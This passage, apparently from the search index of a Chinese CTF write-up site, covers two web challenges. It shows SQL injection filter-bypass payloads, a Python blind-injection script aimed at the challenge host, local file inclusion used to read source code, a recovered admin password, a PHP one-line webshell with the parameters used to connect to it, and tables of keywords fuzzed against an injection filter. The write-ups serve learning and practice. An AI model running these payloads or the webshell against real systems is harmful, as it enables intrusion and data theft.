userpass='$userpass'\",$con);\n      if(mysql_num_rows($result)\n0 \nmysql_num_rows($login)\n=0){\n      echo \"\nscript \nalert('昵称已被使用，请更换！');\n/script \n\";\n      mysql_free_result($login);\n      mysql_free_result($result);\n      mysql_close($con);\n      exit();\n      }\n      mysql_free_result($login);\n      mysql_free_result($result);\n      $say=mysql_real_escape_string($say);\n      mysql_query(\"insert into message (nice,say,display) values('$nice','$say',0)\",$con);\n      mysql_close($con);\n      echo '\nscript \nalert(\"构建和谐社会，留言需要经过管理员审核才可以显示！\");window.location = \"./index.php \"\n/script \n';\n      ?\n\n      \ntitle\n/title\n\n  \n/head\n\n  \nbody\n\n  \n/body\n\n\n\n\n\n  ```\n\n\n\n\nmysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, \\, ', \" 和 \\x1a.\n\n\n\n\n\n\n除了sm.txt中提到的文件，还不要忘记\nabout.php\n页面\n\n\n\n\nabout.php\n\n\nphp+html\n  \nmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\n \n  \n?php\n  $file = $_GET['file'];\n  if ($file == \"\" || strstr($file, 'config.php')) {\n      echo \"file参数不能为空！\";\n      exit();\n  } else {\n      $cut = strchr($file, \"loginxlcteam\");\n      if ($cut == false) {\n          $data = file_get_contents($file);\n          $date = htmlspecialchars($data);\n          echo $date;\n      } else {\n          echo \"\nscript\nalert('敏感目录，禁止查看！但是。。。')\n/script\n\";\n      }\n  }\n  ?\n\n  这里注意到\nloginxlcteam\n，直接访问\n/loginxlcteam\n的页面，该页面为后台管理登录页面\n\n\n\n\n在搜索时，会提交到so.php\n\n\n\n\nso.php\n\n\nphp+html\n  \nhtml\n\n      \nhead\n\n          \nmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"\n\n          \ntitle\n\n              搜索留言\n          \n/title\n\n      \n/head\n\n      \nbody\n\n          \ncenter\n\n              \ndiv id=\"say\" name=\"say\" align=\"left\" style=\"width:1024px\"\n\n                  \n?php\n                  if ($_SERVER['HTTP_USER_AGENT'] != \"Xlcteam Browser\") {\n                      echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~';\n                      exit();\n                  }\n                  $id = $_POST['soid'];\n                  include 'config.php';\n                  include 'antiinject.php';\n                  include 'antixss.php';\n                  $id = antiinject($id);\n                  $con = mysql_connect($db_address, $db_user, $db_pass) or die(\"不能连接到数据库！！\" . mysql_error());\n                  mysql_select_db($db_name, $con);\n                  $id = mysql_real_escape_string($id);\n                  $result = mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\");\n                  $rs = mysql_fetch_array($result);\n                  echo htmlspecialchars($rs['nice']) . ':\nbr /\nnbsp;\nnbsp;\nnbsp;\nnbsp;' . antixss($rs['say']) . '\nbr /\n';\n                  mysql_free_result($result);\n                  mysql_free_result($file);\n                  mysql_close($con); ?\n\n              \n/div\n\n          \n/center\n\n      \n/body\n\n  \n/html\n\n\n\n\n这里又发现了新的php页面antiinject.php\n\n\n修改useragent为\nXlcteam Browser\n来访问so.php页面\n\n\n\n\n这里存在可能的sql注入漏洞，继续查看antiinject.php\n\n\n\n\n\n\nantiinject.php\n\n\n\n\n\n\nphp+html\n   \n?php\n   function antiinject($content) {\n    $keyword = array(\n        \"select\",\n        \"union\",\n        \"and\",\n        \"from\",\n        ' ',\n        \"'\",\n        \";\",\n        '\"',\n        \"char\",\n        \"or\",\n        \"count\",\n        \"master\",\n        \"name\",\n        \"pass\",\n        \"admin\",\n        \"+\",\n        \"-\",\n        \"order\",\n        \"=\"\n    );\n    $info = strtolower($content);\n    for ($i = 0; $i \n= count($keyword); $i++) {\n        $info = str_replace($keyword[$i], '', $info);\n    }\n    return $info;\n   } ?\n\n   - 这里发现：\n\n\n\n\n本网站对部分关键字与空格进行了过滤，因此对于关键词使用双重绕过，空格用/**/代替 \n\n\n\n\n\n\n\n\nsql注入语句\n\n\n\n\n\n\n在post中提交数据：（这里省略了猜测字段列数的过程）\n\n\nmssql\nsoid=0/**/unUNIONion/**/seSELECTlect/**/1,userpasPASSs,3,4/**/fFROMrom/**/adADMINmin\n\n\n得到返回：\n\n\n\n\n102 117 99 107 114 117 110 116 117\n\n\n\n\n\n\n\n\n使用盲注的方法\n\n\n编写python脚本\n\n\n```python\n\n\n-\n- coding: UTF-8 -\n-\n\n\nimport requests\n\n\ndef get_db():\n    url = \"http://cms.nuptzj.cn/so.php\"\n    header = {\n        'User-Agent': 'Xlcteam Browser',\n        'Host': 'cms.nuptzj.cn',\n    }\n    payload1 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    result = \"\"\n    for j in range(1, 35):\n        for i in payload1:\n            char = str(ord(i))\n            num = str(j)\n            payload = '1/\n/aANDnd/\n/exists(seSELECTlect/\n/*/\n/fFROMrom/\n/admADMINin/\n/where/\n/oORrd(substring(userpPASSass/\n/frFROMom/\n/{0}/\n/foORr/\n/1))\n{1})'.format(num,char)\n            # payload = '1/\nx\n/anANDd/\nx\n/exists(seleSELECTct/\nx\n/\n/\nx\n/frFROMom/\nx\n/admiADMINn/\nx\n/WHERE/\nx\n/oORrd(substring(userpaspasss/\nx\n/froFROMm/\nx\n/{0}/\na\n/FOorR/\na*/1))\n{1})'.format(num, char)\n            data = {\n                    \"soid\":payload\n            }\n            response = requests.post(url=url,headers=header,data=data)\n            text = response.text\n            print text\n            # text = str(text)\n            result_len = len(text)\n            if(result_len \n 430):\n                result += chr(int(char))\n                break\n    print(result)\n\n\nget_db()\n```\n\n\n得到结果：\n\n\n\n\n1020117099010701140117011001160117\n\n\n\n\n\n\n\n\n使用sqlmap+tamper\n\n\n\n\n[ ] 待实现\n\n\nnonrecursivereplacement.py\n  双重查询语句绕过\n\n\n\n\nmysql\nkeywords = (\"UNION\", \"SELECT\", \"INSERT\", \"UPDATE\", \"FROM\", \"WHERE\")\n\n\n在该tamper中只实现了以上几个关键词的双重过滤，而实际情况需要根据过滤的名单来确定，所以其灵活性不够，不知道是否有可以自定义过滤名单的tamper，或者需要自己实现一个该类型的tamper\n\n\n\n\nspace2comment.py\n 用/**/代替空格  \n\n\n\n\nshell\n  sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=\"between.py, randomcase.py,space2comment.py\" -v 3\n  dpkg -L sqlmap | grep tamper (找要引用的脚本)  \n  -v 3是为了显示更加详细的内容\n\n\n\n\n\n\n\n\n\n\n观察得到的结果，联系passencode.php，可以解出password为：fuckruntu \n\n\n\n\n\n\n0x3 登录后台\n\n\n\n\n使用得到的用户名密码登录后台，看到页面\n\n\n\n\n\n\n恭喜你已拿下后台，离爆菊只差一步了flag1:nctf{}\n\n\n能来到这里，相信也不是只会用工具的脚本小子了\n现在离爆菊只差一步了\n因为程序猿连后台都懒得开发了，为了方便管理，他邪恶地放了一个一句话木马在网站的根目录下\n小马的文件名为：xlcteam.php\n黑阔，哎哟~不错哦\n\n\n\n\n\n\n查看xlcteam.php\n\n\n\n\n?php\n\n$e = $_REQUEST['www'];\n$arr = array(\n    $_POST['wtf'] =\n '|.*|e',\n);\narray_walk($arr, $e, ''); ?\n\n\n\n\n\n\n\n\n该页面为php回调函数一句话，使用菜刀连接\n\n\n\n\nhttp://cms.nuptzj.cn/loginxlcteam/xlcteam.php?www=str_replace  密码：wtf\n\n\n​   或者提交以下命令：\n\n\nwtf='print_r(scandir())'   \n\n\n\n\n​   \n\n\n\n\n遍历文件，看到flag相关的txt文件，打开即得到答案\n\n\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "综合2"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#2", 
            "text": "", 
            "title": "综合2"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#%E7%BB%BC%E5%90%88%E9%A2%982  ```\nXlcteam客户留言板  欢迎来到Xlcteam客户留言板，各位朋友可以在这里留下对本公司的意见或建议。  本组织主要为企业提供网络安全服务。正如公司名所说，本公司是混迹在“娱乐圈”中的公司，喜欢装B，一直摸黑竞争对手，从未被黑。\n  本公司的经营理念为“技术好，算个吊，摸黑对手有一套，坑到学生才叫吊~”。\n  你别说不爽我们，有本事来爆我们（科哥）菊花~ come on！！  客户留言：  大秘密:\n    交个朋友吧，这个是我微信号 e045e454c18ca8a4415cfeddd1f7375eb0595c71ac00a0e4758761e1cc83f2c565bb09bfd94d1f6c2ffc0fb9849203a14af723b532cbf44a2d6f41b0dee4e834 这是原来管理员说的话，一不小心给覆盖了，sorry！！！欢迎来到xlcteam渗透挑战平台，在这里各位黑阔可以尽情施展你们那牛X的技术和猥琐流的渗透技巧。 （别说SAE没有写权限传不了shell，渗透到后台之后就什么都知道了）。 对了，各位脚本小子就不要拿各种扫描工具猛扫了，也扫不到什么东西的。当然，适当的收集资料还是可以的\nt0n9:\n    t0n9\nggggg:\n    hi\nBeta.meee:\n    Hacked by meee\nsido:\n    123\nHolden:\n    山东红蓝队\n小圆圆，小圆圆！:\n    hacked by 小圆圆\n```", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#_2", 
            "text": "遍历所有页面，查看所有隐藏信息  使用LFI查看所有页面的源代码", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#_3", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#0x1", 
            "text": "", 
            "title": "0x1 查看页面底部的链接"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#cms", 
            "text": "内容如下：   很明显，这是安装后留下来忘删除的文件。。。 至于链接会出现在主页上，这就要问管理员了。。。 ===============================华丽的分割线============================= 本CMS由Funny公司开发的公司留言板系统，据本技术总监说，此CMS采用国际 顶级的技术所开发，安全性和实用性杠杠滴~  以下是本CMS各文件的功能说明（由于程序猿偷懒，只列了部分文件） config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索，我在这里给出admin表结构 create table admin ( id integer, username text, userpass text, ) ======================================================================== 下面是正经的： 本渗透测试平台由：三只小潴(root#zcnhonker.net)  冷爱(hh250@qq.com)开 发.由你们周老大我辛苦修改，不能题目都被AK嘛，你们说是不是。所以这一题。。你们做出来也算你们吊咯。    可以得知：    页面包含的文件如下：    config.php   passencode.php   index.php  say.php   sm.txt    admin的表结构如下：    mssql\n   create table admin ( id integer, username text, userpass text, )", 
            "title": "本CMS说明"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#0x2", 
            "text": "通过文件包含的方式（类似http://cms.nuptzj.cn/about.php?file=sm.txt），依次访问各个文件   config.php    无任何返回值   passencode.php    php+HTML\n   ?php function passencode($content){\n      $pass=urlencode($content);\n      $array=str_split($content);\n      $pass=\"\"; \n      for($i=0;$i count($array);$i++){\n          if($pass!=\"\"){\n              $pass=$pass.\" \".(string)ord($array[$i]);}\n          else{ \n              $pass=(string)ord($array[$i]);\n          } \n      } return $pass;\n  }\n  ?  这里可以看出密码在数据库的存储方式：将每个字符转化为其ascii码值，以空格为分隔符进行拼接   say.php    ```php+html\n   \n       \n           \n           ?php\n          include 'config.php';\n          $nice=$_POST['nice'];\n          $say=$_POST['usersay'];\n          if(!isset($_COOKIE['username'])){\n          setcookie('username',$nice);\n          setcookie('userpass','');\n          }\n          $username=$_COOKIE['username'];\n          $userpass=$_COOKIE['userpass'];\n          if($nice==\"\"|| $say==\"\"){\n          echo \" alert('昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)'); \";\n          exit();\n          }\n          $con = mysql_connect($db_address,$db_user,$db_pass) or die(\"不能连接到数据库！！\".mysql_error());\n          mysql_select_db($db_name,$con);\n          $nice=mysql_real_escape_string($nice);        $username=mysql_real_escape_string($username);\n      $userpass=mysql_real_escape_string($userpass);\n      $result=mysql_query(\"SELECT username FROM admin where username='$nice'\",$con);\n      $login=mysql_query(\"SELECT * FROM admin where username='$username' AND userpass='$userpass'\",$con);\n      if(mysql_num_rows($result) 0  mysql_num_rows($login) =0){\n      echo \" script  alert('昵称已被使用，请更换！'); /script  \";\n      mysql_free_result($login);\n      mysql_free_result($result);\n      mysql_close($con);\n      exit();\n      }\n      mysql_free_result($login);\n      mysql_free_result($result);\n      $say=mysql_real_escape_string($say);\n      mysql_query(\"insert into message (nice,say,display) values('$nice','$say',0)\",$con);\n      mysql_close($con);\n      echo ' script  alert(\"构建和谐社会，留言需要经过管理员审核才可以显示！\");window.location = \"./index.php \" /script  ';\n      ? \n       title /title \n   /head \n   body \n   /body   \n  ```   mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, \\, ', \" 和 \\x1a.    除了sm.txt中提到的文件，还不要忘记 about.php 页面   about.php  php+html\n   meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /  \n   ?php\n  $file = $_GET['file'];\n  if ($file == \"\" || strstr($file, 'config.php')) {\n      echo \"file参数不能为空！\";\n      exit();\n  } else {\n      $cut = strchr($file, \"loginxlcteam\");\n      if ($cut == false) {\n          $data = file_get_contents($file);\n          $date = htmlspecialchars($data);\n          echo $date;\n      } else {\n          echo \" script alert('敏感目录，禁止查看！但是。。。') /script \";\n      }\n  }\n  ? \n  这里注意到 loginxlcteam ，直接访问 /loginxlcteam 的页面，该页面为后台管理登录页面   在搜索时，会提交到so.php   so.php  php+html\n   html \n       head \n           meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" \n           title \n              搜索留言\n           /title \n       /head \n       body \n           center \n               div id=\"say\" name=\"say\" align=\"left\" style=\"width:1024px\" \n                   ?php\n                  if ($_SERVER['HTTP_USER_AGENT'] != \"Xlcteam Browser\") {\n                      echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~';\n                      exit();\n                  }\n                  $id = $_POST['soid'];\n                  include 'config.php';\n                  include 'antiinject.php';\n                  include 'antixss.php';\n                  $id = antiinject($id);\n                  $con = mysql_connect($db_address, $db_user, $db_pass) or die(\"不能连接到数据库！！\" . mysql_error());\n                  mysql_select_db($db_name, $con);\n                  $id = mysql_real_escape_string($id);\n                  $result = mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\");\n                  $rs = mysql_fetch_array($result);\n                  echo htmlspecialchars($rs['nice']) . ': br / nbsp; nbsp; nbsp; nbsp;' . antixss($rs['say']) . ' br / ';\n                  mysql_free_result($result);\n                  mysql_free_result($file);\n                  mysql_close($con); ? \n               /div \n           /center \n       /body \n   /html   这里又发现了新的php页面antiinject.php  修改useragent为 Xlcteam Browser 来访问so.php页面   这里存在可能的sql注入漏洞，继续查看antiinject.php    antiinject.php    php+html\n    ?php\n   function antiinject($content) {\n    $keyword = array(\n        \"select\",\n        \"union\",\n        \"and\",\n        \"from\",\n        ' ',\n        \"'\",\n        \";\",\n        '\"',\n        \"char\",\n        \"or\",\n        \"count\",\n        \"master\",\n        \"name\",\n        \"pass\",\n        \"admin\",\n        \"+\",\n        \"-\",\n        \"order\",\n        \"=\"\n    );\n    $info = strtolower($content);\n    for ($i = 0; $i  = count($keyword); $i++) {\n        $info = str_replace($keyword[$i], '', $info);\n    }\n    return $info;\n   } ? \n   - 这里发现：   本网站对部分关键字与空格进行了过滤，因此对于关键词使用双重绕过，空格用/**/代替      sql注入语句    在post中提交数据：（这里省略了猜测字段列数的过程）  mssql\nsoid=0/**/unUNIONion/**/seSELECTlect/**/1,userpasPASSs,3,4/**/fFROMrom/**/adADMINmin  得到返回：   102 117 99 107 114 117 110 116 117     使用盲注的方法  编写python脚本  ```python", 
            "title": "0x2 依次访问各文件"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#-coding-utf-8-", 
            "text": "import requests  def get_db():\n    url = \"http://cms.nuptzj.cn/so.php\"\n    header = {\n        'User-Agent': 'Xlcteam Browser',\n        'Host': 'cms.nuptzj.cn',\n    }\n    payload1 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    result = \"\"\n    for j in range(1, 35):\n        for i in payload1:\n            char = str(ord(i))\n            num = str(j)\n            payload = '1/ /aANDnd/ /exists(seSELECTlect/ /*/ /fFROMrom/ /admADMINin/ /where/ /oORrd(substring(userpPASSass/ /frFROMom/ /{0}/ /foORr/ /1)) {1})'.format(num,char)\n            # payload = '1/ x /anANDd/ x /exists(seleSELECTct/ x / / x /frFROMom/ x /admiADMINn/ x /WHERE/ x /oORrd(substring(userpaspasss/ x /froFROMm/ x /{0}/ a /FOorR/ a*/1)) {1})'.format(num, char)\n            data = {\n                    \"soid\":payload\n            }\n            response = requests.post(url=url,headers=header,data=data)\n            text = response.text\n            print text\n            # text = str(text)\n            result_len = len(text)\n            if(result_len   430):\n                result += chr(int(char))\n                break\n    print(result)  get_db()\n```  得到结果：   1020117099010701140117011001160117     使用sqlmap+tamper   [ ] 待实现  nonrecursivereplacement.py   双重查询语句绕过   mysql\nkeywords = (\"UNION\", \"SELECT\", \"INSERT\", \"UPDATE\", \"FROM\", \"WHERE\")  在该tamper中只实现了以上几个关键词的双重过滤，而实际情况需要根据过滤的名单来确定，所以其灵活性不够，不知道是否有可以自定义过滤名单的tamper，或者需要自己实现一个该类型的tamper   space2comment.py  用/**/代替空格     shell\n  sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=\"between.py, randomcase.py,space2comment.py\" -v 3\n  dpkg -L sqlmap | grep tamper (找要引用的脚本)  \n  -v 3是为了显示更加详细的内容      观察得到的结果，联系passencode.php，可以解出password为：fuckruntu", 
            "title": "-- coding: UTF-8 --"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#0x3", 
            "text": "使用得到的用户名密码登录后台，看到页面    恭喜你已拿下后台，离爆菊只差一步了flag1:nctf{}  能来到这里，相信也不是只会用工具的脚本小子了\n现在离爆菊只差一步了\n因为程序猿连后台都懒得开发了，为了方便管理，他邪恶地放了一个一句话木马在网站的根目录下\n小马的文件名为：xlcteam.php\n黑阔，哎哟~不错哦    查看xlcteam.php   ?php\n\n$e = $_REQUEST['www'];\n$arr = array(\n    $_POST['wtf'] =  '|.*|e',\n);\narray_walk($arr, $e, ''); ?    该页面为php回调函数一句话，使用菜刀连接   http://cms.nuptzj.cn/loginxlcteam/xlcteam.php?www=str_replace  密码：wtf  ​   或者提交以下命令：  wtf='print_r(scandir())'     ​      遍历文件，看到flag相关的txt文件，打开即得到答案", 
            "title": "0x3 登录后台"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#_4", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/", 
            "text": "加了料的报错注入\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/web/baocuo/index.php\n\n\nPlease login! tips:post username and password... \n\n\n\n\n分类：\nsql injection\n \nsql语句已知\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n无\n\n\n步骤\n\n\n0x1 查看源文件\n\n\n $sql=\nselect * from users where username='$username' and password='$password'\n;  \n\n\n\n\n所以，应该post提交username和password字段\n\n\n0x2 常规测试\n\n\n\n\n在hackbar中提交正常值\n\n\n\n\nusername=admin\npassword=admin\n\n\n\n\n返回\n\n\n\n\nLogin failed\n\n\n\n\n\n\n\n\n常规测试\n\n\n\n\n\n\n''\n\n\nmysql\n  username=admin'\npassword=admin\n\n\n返回\n\n\n\n\nYou have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near 'admin''  at line 1 \n\n\n\n\n说明存在sql注入，字符型\n\n\n\n\n\n\n' and 1=1#\n\n\nmysql\n  username=admin' and 1=1#\npassword=admin\n\n\n返回\n\n\n\n\nSql injection detected\n\n\n\n\n\n\n\n\n发现有sql注入检测，bp跑一下\n\n\n\n\nRequest Payload Length\n40  (   270\n41  )   270\n59  ,   270\n3   substr  273\n4   sleep   273\n7   union   273\n11  limit   273\n15  order by    273\n29  mid 273\n30  ord 273\n26  rand    273\n34  #   273\n44  -   273\n45  =   273\n53  ;   273\n2   to  337\n0       337\n1   for 337\n6   select  337\n8   concat  337\n9   or  337\n5   ExtractValue    337\n10  and 337\n13  ||  337\n14  group by    337\n12  \n  337\n16  into outfile    337\n17  into    337\n18  into dumpfile   337\n19  having  337\n20  where   337\n22  update  337\n23  delete  337\n21  insert  337\n24  updatexml   337\n25  if  337\n27  from    337\n28  information_schema  337\n32  !   337\n33  @   337\n31  ~   337\n35  $   337\n36  %   337\n37  ^   337\n38  \n   337\n39  *   337\n42  _   337\n43  +   337\n46  [   337\n48  {   337\n49  }   337\n47  ]   337\n51  |   337\n52  :   337\n54  \"   337\n56  \n   337\n57  \n   337\n58  ?   337\n61  /   337\n62  `   337\n60  .   337    \n\n\n50  \\   360\n55  '   360\n\n\n\n\n有三种情况:\n\n\n270:\nUser name unknow error.\n\n\n273:\nSql injection detected\n\n\n337: \nLogin failed\n\n\n360:\nYou have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near 'admin''  at line 1\n \n\n\n\n\n\n\nsql语句为\n\n\nmysql\n   $sql=\"select * from users where username='$username' and password='$password'\";\n\n\n构造查询语句\n\n\nmysql\n  admin' union select 1 where 't'='t\n\n\n~~双重sql语句测试~~（只能用于过滤，不能用于检测到即报错的情况）\n\n\nmysql\n  admin' unionunion select 1 where 't' regexp 't\n\n\n~~被检测到，使用嵌套双重sql~~（同上）\n\n\nmysql\n  admin' ununionion select 1 where 't' regexp 't\n\n\n仍然被检测到，使用大小写\n\n\nmysql\n  admin' Union select 1 where 't' regexp 't\n\n\n仍然被检测到，修改空格字符为\n%0a\n\n\nmysql\n  admin'%0aUnion%0aselect%0a1%0awhere%0a't'%0aregexp%0a't\n\n\n仍然被检测到，考虑报错注入；\n\n\n\n\n\n\n0x3 报错注入\n\n\n查看username字段中\nupdatexml\n未被过滤，但是\n（）\n被过滤掉了，再fuzz一下\npassword\n\n\n\n\nRequest   Payload Length\n0     337\n1 regexp  337\n2 like    273\n3 between 337\n4 for 337\n5 to  337\n6 substr  273\n7 sleep   273\n8 ExtractValue    270\n9 select  337\n10    union   273\n11    concat  337\n12    or  337\n13    and 337\n14    limit   273\n15    \n  337\n16    ||  337\n17    group by    337\n18    order by    273\n19    into outfile    337\n20    into    337\n21    into dumpfile   337\n22    having  337\n23    where   337\n24    insert  337\n25    update  337\n26    delete  337\n27    updatexml   270\n28    if  337\n29    rand    273\n30    from    337\n31    information_schema  337\n32    mid 273\n33    ord 273\n34    ~   337\n35    !   337\n36    @   337\n37    #   273\n38    $   337\n39    %   337\n40    ^   337\n41    \n   337\n42    *   337\n43    (   337\n44    )   337\n45    _   337\n46    +   337\n47    -   273\n48    =   273\n49    [   337\n50    ]   337\n51    {   337\n52    }   337\n53    \\   357\n54    |   337\n55    :   337\n56    ;   273\n57    \"   337\n58    '   357\n59    \n   337\n60    \n   337\n61    ?   337\n62    ,   337\n63    .   337\n64    /   337\n65    `   337\n\n\n\n\n发现\n()\n没有被过滤，可以使用报错注入\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n设定题目难度等级\nlevel\n为\n\n\n\n\n提交相应符合要求的字符串", 
            "title": "加了料的报错注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_1", 
            "text": "", 
            "title": "加了料的报错注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_2", 
            "text": "http://ctf5.shiyanbar.com/web/baocuo/index.php  Please login! tips:post username and password...    分类： sql injection   sql语句已知", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_3", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_4", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_5", 
            "text": "无", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_6", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#0x1", 
            "text": "$sql= select * from users where username='$username' and password='$password' ;    所以，应该post提交username和password字段", 
            "title": "0x1 查看源文件"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#0x2", 
            "text": "在hackbar中提交正常值   username=admin password=admin  返回", 
            "title": "0x2 常规测试"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#login-failed", 
            "text": "常规测试    ''  mysql\n  username=admin' password=admin  返回   You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near 'admin''  at line 1    说明存在sql注入，字符型    ' and 1=1#  mysql\n  username=admin' and 1=1# password=admin  返回", 
            "title": "Login failed"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#sql-injection-detected", 
            "text": "发现有sql注入检测，bp跑一下   Request Payload Length\n40  (   270\n41  )   270\n59  ,   270\n3   substr  273\n4   sleep   273\n7   union   273\n11  limit   273\n15  order by    273\n29  mid 273\n30  ord 273\n26  rand    273\n34  #   273\n44  -   273\n45  =   273\n53  ;   273\n2   to  337\n0       337\n1   for 337\n6   select  337\n8   concat  337\n9   or  337\n5   ExtractValue    337\n10  and 337\n13  ||  337\n14  group by    337\n12     337\n16  into outfile    337\n17  into    337\n18  into dumpfile   337\n19  having  337\n20  where   337\n22  update  337\n23  delete  337\n21  insert  337\n24  updatexml   337\n25  if  337\n27  from    337\n28  information_schema  337\n32  !   337\n33  @   337\n31  ~   337\n35  $   337\n36  %   337\n37  ^   337\n38      337\n39  *   337\n42  _   337\n43  +   337\n46  [   337\n48  {   337\n49  }   337\n47  ]   337\n51  |   337\n52  :   337\n54  \"   337\n56      337\n57      337\n58  ?   337\n61  /   337\n62  `   337\n60  .   337      50  \\   360\n55  '   360   有三种情况:  270: User name unknow error.  273: Sql injection detected  337:  Login failed  360: You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near 'admin''  at line 1      sql语句为  mysql\n   $sql=\"select * from users where username='$username' and password='$password'\";  构造查询语句  mysql\n  admin' union select 1 where 't'='t  ~~双重sql语句测试~~（只能用于过滤，不能用于检测到即报错的情况）  mysql\n  admin' unionunion select 1 where 't' regexp 't  ~~被检测到，使用嵌套双重sql~~（同上）  mysql\n  admin' ununionion select 1 where 't' regexp 't  仍然被检测到，使用大小写  mysql\n  admin' Union select 1 where 't' regexp 't  仍然被检测到，修改空格字符为 %0a  mysql\n  admin'%0aUnion%0aselect%0a1%0awhere%0a't'%0aregexp%0a't  仍然被检测到，考虑报错注入；", 
            "title": "Sql injection detected"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#0x3", 
            "text": "查看username字段中 updatexml 未被过滤，但是 （） 被过滤掉了，再fuzz一下 password   Request   Payload Length\n0     337\n1 regexp  337\n2 like    273\n3 between 337\n4 for 337\n5 to  337\n6 substr  273\n7 sleep   273\n8 ExtractValue    270\n9 select  337\n10    union   273\n11    concat  337\n12    or  337\n13    and 337\n14    limit   273\n15       337\n16    ||  337\n17    group by    337\n18    order by    273\n19    into outfile    337\n20    into    337\n21    into dumpfile   337\n22    having  337\n23    where   337\n24    insert  337\n25    update  337\n26    delete  337\n27    updatexml   270\n28    if  337\n29    rand    273\n30    from    337\n31    information_schema  337\n32    mid 273\n33    ord 273\n34    ~   337\n35    !   337\n36    @   337\n37    #   273\n38    $   337\n39    %   337\n40    ^   337\n41        337\n42    *   337\n43    (   337\n44    )   337\n45    _   337\n46    +   337\n47    -   273\n48    =   273\n49    [   337\n50    ]   337\n51    {   337\n52    }   337\n53    \\   357\n54    |   337\n55    :   337\n56    ;   273\n57    \"   337\n58    '   357\n59        337\n60        337\n61    ?   337\n62    ,   337\n63    .   337\n64    /   337\n65    `   337   发现 () 没有被过滤，可以使用报错注入", 
            "title": "0x3 报错注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_7", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_add_something/#_8", 
            "text": "TODO    设定题目难度等级 level 为   提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/", 
